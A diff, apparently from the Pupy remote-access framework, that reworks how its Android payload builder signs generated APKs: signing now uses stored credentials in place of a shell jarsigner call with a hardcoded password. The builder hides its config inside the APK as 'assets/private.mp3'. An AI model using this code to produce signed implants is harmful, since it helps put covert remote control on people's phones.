@@ -28,7 +28,10 @@ import os
 import pylzma
 import struct
 
+from io import BytesIO
+
 from pupylib.utils.network import get_listener_ip, get_listener_port
+from pupylib.utils.jarsigner import jarsigner
 from pupylib.payloads import dependencies
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
@@ -221,6 +224,16 @@ def updateTar(arcpath, arcname, file_path):
         shutil.rmtree(tempdir)
 
 def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
+
+    credentials = Credentials(role='control')
+
+    priv_key = credentials['APK_PRIV_KEY']
+    pub_key = credentials['APK_PUB_KEY']
+
+    if not priv_key or not pub_key:
+        raise ValueError(
+            'CONTROL_APK_PRIV_KEY/CONTROL_APK_PUB_KEY credentials missing (old credentials)')
+
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
@@ -247,21 +260,9 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
             updateZip(tempapk, "assets/private.mp3", t.read())
 
         #signing the tar
-        try:
-            subprocess.check_output(
-                'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 '
-                '-keystore crypto/pupy-apk-release-key.keystore '
-                '-storepass pupyp4ssword %s pupy_key'%repr(tempapk), shell=True)
-
-            with open(tempapk) as apk:
-                return apk.read()
-
-        except subprocess.CalledProcessError, e:
-            display(Error(e.output))
-        except OSError, e:
-            if e.errno == os.errno.ENOENT:
-                display(Error('Please install jarsigner first.'))
-            raise e
+        result = BytesIO()
+        jarsigner(priv_key, pub_key, tempapk, result)
+        return result.getvalue()
 
     finally:
         #cleaning up
